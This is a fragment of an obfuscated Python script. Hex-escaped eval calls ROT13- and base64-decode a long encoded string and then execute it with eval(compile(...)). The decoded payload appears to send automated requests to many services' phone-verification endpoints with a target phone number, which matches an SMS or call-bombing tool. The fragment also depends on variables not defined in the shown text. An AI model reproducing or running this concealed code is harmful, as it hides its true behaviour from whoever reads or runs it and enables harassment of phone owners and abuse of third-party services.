destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))